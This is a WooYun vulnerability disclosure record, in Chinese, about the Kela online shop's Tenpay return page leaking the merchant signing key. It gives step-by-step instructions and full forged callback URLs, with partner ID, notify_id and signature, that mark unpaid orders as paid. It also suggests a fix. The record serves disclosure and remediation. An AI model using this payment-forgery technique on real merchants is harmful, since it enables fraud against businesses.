{"id": 75403, "wybug_id": "wooyun-2016-0167579", "wybug_title": "珂兰网上商城敏感泄露导致订单直接可显示支付成功", "wybug_corp": "上海珂兰商贸有限公司", "wybug_author": "江湖闯名号", "wybug_date": "2016-01-06 22:27", "wybug_open_date": "2016-02-20 15:48", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-06：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-02-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  珂兰官方网站：http://www.kela.cn步骤很简单，下单后选择财付通支付，之后找到return_url项，访问该地址即可看到财付通的key，根据财付通的付款成功返回规则填写好，获得url：http://www.kela.cn/payment/tenpay/afterpay/order_type/1/order_sn/20160105751366/pay_mod/1/order_payment_sn/2016010575136619685?&bank_type=0&discount=0&fee_type=1&input_charset=GBK&notify_id=NWIW8mCc1Cf3zg6Lh0ADUAiJzWT4Rit-LLgJSWR00PMXnRGlqPx6MzwOLiHrrw7e1eOBKGCfEwhX8IantaySZjS85eDgO2BD&out_trade_no=2016010575136619685&partner=1216068301&product_fee=1299900&sign_type=MD5&time_end=201601051826&total_fee=1299900&trade_mode=1&trade_state=0&transaction_id=1216068301201601050867118285&transport_fee=0&sign=9410d841911f211c6da6495ef0faa77b该订单已验证过了 直接回提示支付成功的，改下订单号吧http://www.kela.cn/payment/tenpay/afterpay/order_type/1/order_sn/20160105514347/pay_mod/1/order_payment_sn/2016010551434711072?&bank_type=0&discount=0&fee_type=1&input_charset=GBK&notify_id=NWIW8mCc1Cf3zg6Lh0ADUAiJzWT4Rit-LLgJSWR00PMXnRGlqPx6MzwOLiHrrw7e1eOBKGCfEwhX8IantaySZjS85eDgO2BD&out_trade_no=2016010575136619685&partner=1216068301&product_fee=1299900&sign_type=MD5&time_end=201601051826&total_fee=1299900&trade_mode=1&trade_state=0&transaction_id=1216068301201601050867118285&transport_fee=0&sign=9410d841911f211c6da6495ef0faa77b用这个就可以直接看到了。其他就不多说了，就是notify_id需要用新支付过的用老的会提示不成功的，所以我去别的地方付过1块钱的得到了一个最新的notify_id，用老的或者是随便乱编的notify_id是不会提示成功的。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n   漏洞证明：  珂兰官方网站：http://www.kela.cn步骤很简单，下单后选择财付通支付，之后找到return_url项，访问该地址即可看到财付通的key，根据财付通的付款成功返回规则填写好，获得url：http://www.kela.cn/payment/tenpay/afterpay/order_type/1/order_sn/20160105751366/pay_mod/1/order_payment_sn/2016010575136619685?&bank_type=0&discount=0&fee_type=1&input_charset=GBK&notify_id=NWIW8mCc1Cf3zg6Lh0ADUAiJzWT4Rit-LLgJSWR00PMXnRGlqPx6MzwOLiHrrw7e1eOBKGCfEwhX8IantaySZjS85eDgO2BD&out_trade_no=2016010575136619685&partner=1216068301&product_fee=1299900&sign_type=MD5&time_end=201601051826&total_fee=1299900&trade_mode=1&trade_state=0&transaction_id=1216068301201601050867118285&transport_fee=0&sign=9410d841911f211c6da6495ef0faa77b该订单已验证过了 直接回提示支付成功的，改下订单号吧http://www.kela.cn/payment/tenpay/afterpay/order_type/1/order_sn/20160105514347/pay_mod/1/order_payment_sn/2016010551434711072?&bank_type=0&discount=0&fee_type=1&input_charset=GBK&notify_id=NWIW8mCc1Cf3zg6Lh0ADUAiJzWT4Rit-LLgJSWR00PMXnRGlqPx6MzwOLiHrrw7e1eOBKGCfEwhX8IantaySZjS85eDgO2BD&out_trade_no=2016010575136619685&partner=1216068301&product_fee=1299900&sign_type=MD5&time_end=201601051826&total_fee=1299900&trade_mode=1&trade_state=0&transaction_id=1216068301201601050867118285&transport_fee=0&sign=9410d841911f211c6da6495ef0faa77b用这个就可以直接看到了。其他就不多说了，就是notify_id需要用新支付过的用老的会提示不成功的，所以我去别的地方付过1块钱的得到了一个最新的notify_id，用老的或者是随便乱编的notify_id是不会提示成功的。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  删除支付成功回调页面显示key和生成sign值的这部分代码。另外我支付成功的订单号是：20160105751366  弱弱的问句：请问算吗？   版权声明：转载请注明来源 江湖闯名号@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}